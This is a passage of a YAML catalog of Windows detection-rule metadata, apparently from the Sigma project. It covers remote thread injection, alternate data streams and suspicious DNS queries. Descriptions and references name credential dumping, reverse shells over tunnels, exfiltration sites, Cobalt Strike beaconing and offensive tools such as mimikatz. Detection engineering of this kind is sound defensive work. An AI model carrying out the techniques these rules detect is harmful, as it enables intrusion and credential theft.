  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.s0005
  - attack.t1003.001
  time_window: ''
  references:
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm
  false_positives:
  - Antivirus products
  notes: ''
- detection_id: 02d1d718-dd13-41af-989d-ea85c7fab93f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_susp_relevant_source_image.yml
  name: Rare Remote Thread Creation By Uncommon Source Image
  description: Detects uncommon processes creating remote threads.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - Personal research, statistical analysis
  - https://lolbas-project.github.io
  false_positives:
  - This rule is best put in testing first in order to create a baseline that reflects
    the data in your environment.
  notes: ''
- detection_id: 66d31e5f-52d6-40a4-9615-002d3789a119
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_susp_uncommon_source_image.yml
  name: Remote Thread Creation By Uncommon Source Image
  description: Detects uncommon processes creating remote threads.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055
  time_window: ''
  references:
  - Personal research, statistical analysis
  - https://lolbas-project.github.io
  false_positives:
  - This rule is best put in testing first in order to create a baseline that reflects
    the data in your environment.
  notes: ''
- detection_id: a1a144b7-5c9b-4853-a559-2172be8d4a03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_susp_uncommon_target_image.yml
  name: Remote Thread Creation In Uncommon Target Image
  description: Detects uncommon target processes for remote thread creation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1055.003
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055.003
  time_window: ''
  references:
  - https://web.archive.org/web/20220319032520/https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection
  false_positives:
  - Unknown
  notes: ''
- detection_id: c15e99a3-c474-48ab-b9a7-84549a7a9d16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_ttdinjec.yml
  name: Remote Thread Creation Ttdinject.exe Proxy
  description: Detects a remote thread creation of Ttdinject.exe used as proxy
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1127
  tags:
  - attack.defense-evasion
  - attack.t1127
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b69888d4-380c-45ce-9cf9-d9ce46e67821
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_ads_executable.yml
  name: Hidden Executable In NTFS Alternate Data Stream
  description: Detects the creation of an ADS (Alternate Data Stream) that contains
    an executable by looking at a non-empty Imphash
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.s0139
  - attack.t1564.004
  time_window: ''
  references:
  - https://twitter.com/0xrawsec/status/1002478725605273600?s=21
  false_positives:
  - This rule isn't looking for any particular binary characteristics. As legitimate
    installers and programs were seen embedding hidden binaries in their ADS. Some
    false positives are expected from browser processes and similar.
  notes: ''
- detection_id: 573df571-a223-43bc-846e-3f98da481eca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_creation_internet_file.yml
  name: Creation Of a Suspicious ADS File Outside a Browser Download
  description: Detects the creation of a suspicious ADS (Alternate Data Stream) file
    by software other than browsers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/exploited-windows-zero-day-lets-javascript-files-bypass-security-warnings/
  false_positives:
  - Other legitimate browsers not currently included in the filter (please add them)
  - Legitimate downloads via scripting or command-line tools (Investigate to determine
    if it's legitimate)
  notes: ''
- detection_id: 52182dfb-afb7-41db-b4bc-5336cb29b464
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_file_sharing_domains_download_susp_extension.yml
  name: Suspicious File Download From File Sharing Websites -  File Stream
  description: Detects the download of suspicious file type from a well-known file
    and paste sharing domain
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.s0139
  - attack.t1564.004
  time_window: ''
  references:
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015
  - https://www.cisa.gov/uscert/ncas/alerts/aa22-321a
  - https://fabian-voith.de/2020/06/25/sysmon-v11-1-reads-alternate-data-streams/
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  false_positives:
  - Some false positives might occur with binaries download via Github
  notes: ''
- detection_id: ae02ed70-11aa-4a22-b397-c0d0e8f6ea99
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_file_sharing_domains_download_unusual_extension.yml
  name: Unusual File Download From File Sharing Websites - File Stream
  description: Detects the download of suspicious file type from a well-known file
    and paste sharing domain
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.s0139
  - attack.t1564.004
  time_window: ''
  references:
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015
  - https://www.cisa.gov/uscert/ncas/alerts/aa22-321a
  - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 19b041f6-e583-40dc-b842-d6fa8011493f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_hktl_generic_download.yml
  name: HackTool Named File Stream Created
  description: Detects the creation of a named file stream with the imphash of a well-known
    hack tool
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.s0139
  - attack.t1564.004
  time_window: ''
  references:
  - https://github.com/gentilkiwi/mimikatz
  - https://github.com/topotam/PetitPotam
  - https://github.com/ohpe/juicy-potato
  - https://github.com/antonioCoco/RoguePotato
  - https://www.tarasco.org/security/pwdump_7/
  - https://github.com/fortra/nanodump
  - https://github.com/codewhitesec/HandleKatz
  - https://github.com/xuanxuan0/DripLoader
  - https://github.com/hfiref0x/UACME
  - https://github.com/outflanknl/Dumpert
  - https://github.com/wavestone-cdt/EDRSandblast
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0d7a9363-af70-4e7b-a3b7-1a176b7fbe84
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_regedit_export_to_ads.yml
  name: Exports Registry Key To an Alternate Data Stream
  description: Exports the target Registry key and hides it in the specified alternate
    data stream.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Regedit/
  - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  false_positives:
  - Unknown
  notes: ''
- detection_id: 025bd229-fd1f-4fdb-97ab-20006e1a5368
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_susp_ip_domains.yml
  name: Unusual File Download from Direct IP Address
  description: Detects the download of suspicious file type from URLs with IP
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  time_window: ''
  references:
  - https://github.com/trustedsec/SysmonCommunityGuide/blob/adcdfee20999f422b974c8d4149bf4c361237db7/chapters/file-stream-creation-hash.md
  - https://labs.withsecure.com/publications/detecting-onenote-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: a3f5c081-e75b-43a0-9f5b-51f26fe5dba2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_winget_susp_package_source.yml
  name: Potential Suspicious Winget Package Installation
  description: Detects potential suspicious winget package installation from a suspicious
    source.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/nasbench/Misc-Research/tree/b9596e8109dcdb16ec353f316678927e507a5b8d/LOLBINs/Winget
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0bb4bbeb-fe52-4044-b40c-430a04577ebe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_stream_hash/create_stream_hash_zip_tld_download.yml
  name: Potentially Suspicious File Download From ZIP TLD
  description: Detects the download of a file with a potentially suspicious extension
    from a .zip top level domain.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_stream_hash
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://twitter.com/cyb3rops/status/1659175181695287297
  - https://fabian-voith.de/2020/06/25/sysmon-v11-1-reads-alternate-data-streams/
  false_positives:
  - Legitimate file downloads from a websites and web services that uses the ".zip"
    top level domain.
  notes: ''
- detection_id: 065cceea-77ec-4030-9052-fc0affea7110
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_anonymfiles_com.yml
  name: DNS Query for Anonfiles.com Domain - Sysmon
  description: Detects DNS queries for "anonfiles.com", which is an anonymous file
    upload platform often used for malicious purposes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte
  false_positives:
  - Rare legitimate access to anonfiles.com
  notes: ''
- detection_id: 7cff77e1-9663-46a3-8260-17f2e1aa9d0a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_appinstaller.yml
  name: AppX Package Installation Attempts Via AppInstaller.EXE
  description: 'Detects DNS queries made by "AppInstaller.EXE". The AppInstaller is
    the default handler for the "ms-appinstaller" URI. It attempts to load/install
    a package from the referenced URL

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://twitter.com/notwhickey/status/1333900137232523264
  - https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a1d9eec5-33b2-4177-8d24-27fe754d0812
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_cloudflared_communication.yml
  name: Cloudflared Tunnels Related DNS Requests
  description: 'Detects DNS requests to Cloudflared tunnels domains.

    Attackers can abuse that feature to establish a reverse shell or persistence on
    a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1572
  time_window: ''
  references:
  - https://www.guidepointsecurity.com/blog/tunnel-vision-cloudflared-abused-in-the-wild/
  - Internal Research
  false_positives:
  - Legitimate use of cloudflare tunnels will also trigger this.
  notes: ''
- detection_id: f8c1e80b-c73a-476a-ae24-6c72528b1521
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_common_malware_hosting_services.yml
  name: DNS Query To Common Malware Hosting and Shortener Services
  description: 'Detects DNS queries to domains commonly used by threat actors to host
    malware payloads or redirect through URL shorteners.

    These include platforms like Cloudflare Workers, TryCloudflare, InfinityFree,
    and URL shorteners such as tinyurl and lihi.cc.

    Such DNS activity can indicate potential delivery or command-and-control communication
    attempts.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  time_window: ''
  references:
  - https://cloud.google.com/blog/topics/threat-intelligence/apt41-innovative-tactics
  false_positives:
  - Legitimate use of these services is possible but rare in enterprise environments
  notes: ''
- detection_id: 1cb0c6ce-3d00-44fc-ab9c-6d6d577bf20b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_devtunnels_communication.yml
  name: DNS Query To Devtunnels Domain
  description: 'Detects DNS query requests to Devtunnels domains. Attackers can abuse
    that feature to establish a reverse shell or persistence on a machine.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1572
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1572
  time_window: ''
  references:
  - https://blueteamops.medium.com/detecting-dev-tunnels-16f0994dc3e2
  - https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/security
  - https://cydefops.com/devtunnels-unleashed
  false_positives:
  - Legitimate use of Devtunnels will also trigger this.
  notes: ''
- detection_id: a21bcd7e-38ec-49ad-b69a-9ea17e69509e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_dns_server_discovery_via_ldap_query.yml
  name: DNS Server Discovery Via LDAP Query
  description: Detects DNS server discovery via LDAP query requests from uncommon
    applications
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1482
  tags:
  - attack.discovery
  - attack.t1482
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/980f3f83fd81f37c1ca9c02dccfd1c3d9f9d0841/atomics/T1016/T1016.md#atomic-test-9---dns-server-discovery-using-nslookup
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04
  false_positives:
  - Likely
  notes: ''
- detection_id: e043f529-8514-4205-8ab0-7f7d2927b400
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_domain_azurewebsites.yml
  name: DNS Query To AzureWebsites.NET By Non-Browser Process
  description: 'Detects a DNS query by a non browser process on the system to "azurewebsites.net".
    The latter was often used by threat actors as a malware hosting and exfiltration
    site.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/wip26-espionage-threat-actors-abuse-cloud-infrastructure-in-targeted-telco-attacks/
  - https://symantec-enterprise-blogs.security.com/threat-intelligence/harvester-new-apt-attacks-asia
  - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/
  - https://intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/
  false_positives:
  - Likely with other browser software. Apply additional filters for any other browsers
    you might use.
  notes: ''
- detection_id: c082c2b0-525b-4dbc-9a26-a57dc4692074
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_finger.yml
  name: DNS Query by Finger Utility
  description: 'Detects DNS queries made by the finger utility, which can be abused
    by threat actors to retrieve remote commands for execution on Windows devices.

    In one ClickFix malware campaign, adversaries leveraged the finger protocol to
    fetch commands from a remote server.

    Since the finger utility is not commonly used in modern Windows environments,
    its presence already raises suspicion.

    Investigating such DNS queries can also help identify potential malicious infrastructure
    used by threat actors for command and control (C2) communication.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://www.bleepingcomputer.com/news/security/decades-old-finger-protocol-abused-in-clickfix-malware-attacks/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7bd3902d-8b8b-4dd4-838a-c6862d40150d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_hybridconnectionmgr_servicebus.yml
  name: DNS HybridConnectionManager Service Bus
  description: Detects Azure Hybrid Connection Manager services querying the Azure
    service bus service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1554
  tags:
  - attack.persistence
  - attack.t1554
  time_window: ''
  references:
  - https://twitter.com/Cyb3rWard0g/status/1381642789369286662
  false_positives:
  - Legitimate use of Azure Hybrid Connection Manager and the Azure Service Bus service
  notes: ''
- detection_id: e7a21b5f-d8c4-4ae5-b8d9-93c5d3f28e1c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_kerberos_coercion_via_dns_object_spoofing.yml
  name: Suspicious DNS Query Indicating Kerberos Coercion via DNS Object SPN Spoofing
  description: 'Detects DNS queries containing patterns associated with Kerberos coercion
    attacks via DNS object spoofing.

    The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds
    to a marshaled CREDENTIAL_TARGET_INFORMATION structure.

    Attackers can use this technique to coerce authentication from victim systems
    to attacker-controlled hosts.

    It is one of the strong indicators of a Kerberos coercion attack, where adversaries
    manipulate DNS records

    to spoof Service Principal Names (SPNs) and redirect authentication requests like
    CVE-2025-33073.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1187
  - T1557.001
  tags:
  - attack.collection
  - attack.credential-access
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1557.001
  - attack.t1187
  time_window: ''
  references:
  - https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
  - https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: f356a9c4-effd-4608-bbf8-408afd5cd006
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_mal_cobaltstrike.yml
  name: Suspicious Cobalt Strike DNS Beaconing - Sysmon
  description: Detects a program that invoked suspicious DNS queries known from Cobalt
    Strike beacons
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.004
  tags:
  - attack.command-and-control
  - attack.t1071.004
  time_window: ''
  references:
  - https://www.icebrg.io/blog/footprints-of-fin7-tracking-actor-patterns
  - https://www.sekoia.io/en/hunting-and-detecting-cobalt-strike/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 613c03ba-0779-4a53-8a1f-47f914a4ded3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_mega_nz.yml
  name: DNS Query To MEGA Hosting Website
  description: Detects DNS queries for subdomains related to MEGA sharing website
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567.002
  tags:
  - attack.exfiltration
  - attack.t1567.002
  time_window: ''
  references:
  - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/
  false_positives:
  - Legitimate DNS queries and usage of Mega
  notes: ''
- detection_id: df68f791-ad95-447f-a271-640a0dab9cf8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_onelaunch_update_service.yml
  name: DNS Query Request To OneLaunch Update Service
  description: 'Detects DNS query requests to "update.onelaunch.com". This domain
    is associated with the OneLaunch adware application.

    When the OneLaunch application is installed it will attempt to get updates from
    this domain.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: low
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1056
  time_window: ''
  references:
  - https://www.malwarebytes.com/blog/detections/pup-optional-onelaunch-silentcf
  - https://www.myantispyware.com/2020/12/14/how-to-uninstall-onelaunch-browser-removal-guide/
  - https://malware.guide/browser-hijacker/remove-onelaunch-virus/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 882e858a-3233-4ba8-855e-2f3d3575803d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_quickassist.yml
  name: DNS Query Request By QuickAssist.EXE
  description: 'Detects DNS queries initiated by "QuickAssist.exe" to Microsoft Quick
    Assist primary endpoint that is used to establish a session.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1210
  tags:
  - attack.command-and-control
  - attack.initial-access
  - attack.lateral-movement
  - attack.t1071.001
  - attack.t1210
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/
  - https://www.linkedin.com/posts/kevin-beaumont-security_ive-been-assisting-a-few-orgs-hit-with-successful-activity-7268055739116445701-xxjZ/
  - https://x.com/cyb3rops/status/1862406110365245506
  - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist
  false_positives:
  - Legitimate use of Quick Assist in the environment.
  notes: ''
- detection_id: 36e037c4-c228-4866-b6a3-48eb292b9955
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_regsvr32_dns_query.yml
  name: DNS Query Request By Regsvr32.EXE
  description: Detects DNS queries initiated by "Regsvr32.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.010
  - T1559.001
  tags:
  - attack.execution
  - attack.t1559.001
  - attack.defense-evasion
  - attack.t1218.010
  time_window: ''
  references:
  - https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
  - https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4d07b1f4-cb00-4470-b9f8-b0191d48ff52
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/dns_query/dns_query_win_remote_access_software_domains_non_browsers.yml
  name: DNS Query To Remote Access Software Domain From Non-Browser App
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  - multi_signal_correlation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: dns_query
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-4---gotoassist-files-detected-test-on-windows
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-3---logmein-files-detected-test-on-windows
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1219/T1219.md#atomic-test-6---ammyy-admin-software-execution
  - https://redcanary.com/blog/misbehaving-rats/
  - https://techcommunity.microsoft.com/t5/microsoft-sentinel-blog/hunting-for-omi-vulnerability-exploitation-with-azure-sentinel/ba-p/2764093
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a
  - https://blog.sekoia.io/scattered-spider-laying-new-eggs/
  - https://learn.microsoft.com/en-us/windows/client-management/client-tools/quick-assist#disable-quick-assist-within-your-organization
  false_positives:
